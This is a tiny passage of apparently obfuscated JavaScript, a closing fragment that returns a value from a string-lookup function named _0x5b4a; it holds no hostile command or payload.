14){return _0x5b4a('0x0');}}



